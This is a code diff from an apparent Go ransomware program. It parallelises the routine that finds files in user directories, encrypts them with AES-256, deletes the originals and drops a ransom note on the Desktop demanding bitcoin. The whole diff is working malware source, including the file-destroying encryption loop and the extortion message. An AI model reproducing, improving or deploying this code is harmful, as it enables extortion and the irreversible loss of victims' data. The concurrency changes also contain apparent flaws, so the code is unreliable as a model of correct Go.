@@ -8,7 +8,6 @@ import (
 	"net/url"
 	"os"
 	"path/filepath"
-	"sync"
 	"time"
 
 	"github.com/mauri870/cryptofile/crypto"
@@ -97,90 +96,90 @@ func encryptFiles() {
 	log.Println("Walking interesting dirs and indexing files...")
 
 	// Loop over the interesting directories
-	for _, f := range cmd.InterestingDirs {
-		folder := cmd.BaseDir + f
-		filepath.Walk(folder, func(path string, f os.FileInfo, err error) error {
-			ext := filepath.Ext(path)
-			if ext != "" {
-				// Matching extensions
-				if utils.StringInSlice(ext[1:], cmd.InterestingExtensions) {
-					file := cmd.File{FileInfo: f, Extension: ext[1:], Path: path}
-					cmd.MatchedFiles = append(cmd.MatchedFiles, file)
-					log.Println("Matched:", path)
+	go func() {
+		for _, f := range cmd.InterestingDirs {
+			folder := cmd.BaseDir + f
+			filepath.Walk(folder, func(path string, f os.FileInfo, err error) error {
+				ext := filepath.Ext(path)
+				if ext != "" {
+					// Matching extensions
+					if utils.StringInSlice(ext[1:], cmd.InterestingExtensions) {
+						file := cmd.File{FileInfo: f, Extension: ext[1:], Path: path}
+						cmd.MatchedFiles <- file
+						log.Println("Matched:", path)
+					}
 				}
-			}
-			return nil
-		})
-	}
-
-	// Setup a wait group so we can process all files
-	var wg sync.WaitGroup
-
-	// Set the number of goroutines we need to wait for while
-	// they process the individual files.
-	wg.Add(len(cmd.MatchedFiles))
+				return nil
+			})
+		}
+		close(cmd.MatchedFiles)
+	}()
 
 	// Loop over the matched files
 	// Launch a goroutine for each file
-	for _, file := range cmd.MatchedFiles {
-		log.Printf("Encrypting %s...\n", file.Path)
+	for i := 0; i < cmd.NumWorkers; i++ {
+		go func() {
+			for {
+				select {
+				case file, ok := <-cmd.MatchedFiles:
+					if !ok {
+						cmd.Done <- true
+						return
+					}
 
-		go func(file cmd.File, wg *sync.WaitGroup) {
-			defer wg.Done()
+					log.Printf("Encrypting %s...\n", file.Path)
 
-			// Read the file content
-			text, err := ioutil.ReadFile(file.Path)
-			if err != nil {
-				log.Println(err)
-				return
+					// Read the file content
+					text, err := ioutil.ReadFile(file.Path)
+					if err != nil {
+						log.Println(err)
+						return
+					}
+
+					// Encrypting using AES-256-CFB
+					ciphertext, err := crypto.Encrypt([]byte(keys["enckey"]), text)
+					if err != nil {
+						log.Println(err)
+						return
+					}
+
+					// Write a new file with the encrypted content followed by the custom extension
+					err = ioutil.WriteFile(file.Path+cmd.EncryptionExtension, ciphertext, 0600)
+					if err != nil {
+						log.Println(err)
+						return
+					}
+
+					// Remove the original file
+					err = os.Remove(file.Path)
+					if err != nil {
+						log.Println("Cannot delete original file, skipping...")
+					}
+				}
 			}
-
-			// Encrypting using AES-256-CFB
-			ciphertext, err := crypto.Encrypt([]byte(keys["enckey"]), text)
-			if err != nil {
-				log.Println(err)
-				return
-			}
-
-			// Write a new file with the encrypted content followed by the custom extension
-			err = ioutil.WriteFile(file.Path+cmd.EncryptionExtension, ciphertext, 0600)
-			if err != nil {
-				log.Println(err)
-				return
-			}
-
-			// Remove the original file
-			err = os.Remove(file.Path)
-			if err != nil {
-				log.Println("Cannot delete original file, skipping...")
-			}
-		}(file, &wg)
+		}()
 	}
 
-	// Wait for everything to be processed.
-	wg.Wait()
+	<-cmd.Done
+	message := `
+	<pre>
+	YOUR FILES HAVE BEEN ENCRYPTED USING A STRONG
+	AES-256 ALGORITHM.
 
-	if len(cmd.MatchedFiles) > 0 {
-		message := `
-		<pre>
-		YOUR FILES HAVE BEEN ENCRYPTED USING A STRONG
-		AES-256 ALGORITHM.
+	YOUR IDENTIFICATION IS %s
 
-		YOUR IDENTIFICATION IS %s
+	PLEASE SEND %s TO THE FOLLOWING WALLET
 
-		PLEASE SEND %s TO THE FOLLOWING WALLET
+		    %s
 
-			    %s
+	TO RECOVER THE KEY NECESSARY TO DECRYPT YOUR
+	FILES
+	</pre>
+	`
+	content := []byte(fmt.Sprintf(message, keys["id"], "0.345 BTC", "XWpXtxrJpSsRx5dICGjUOwkrhIypJKVr"))
 
-		TO RECOVER THE KEY NECESSARY TO DECRYPT YOUR
-		FILES
-		</pre>
-		`
-		content := []byte(fmt.Sprintf(message, keys["id"], "0.345 BTC", "XWpXtxrJpSsRx5dICGjUOwkrhIypJKVr"))
+	// Write the READ_TO_DECRYPT on Desktop
+	ioutil.WriteFile(cmd.BaseDir+"Desktop\\READ_TO_DECRYPT.html", content, 0600)
 
-		// Write the READ_TO_DECRYPT on Desktop
-		ioutil.WriteFile(cmd.BaseDir+"Desktop\\READ_TO_DECRYPT.html", content, 0600)
-
-		log.Println("Done! Don't forget to read the READ_TO_DECRYPT.html file on Desktop")
-	}
+	log.Println("Done! Don't forget to read the READ_TO_DECRYPT.html file on Desktop")
 }
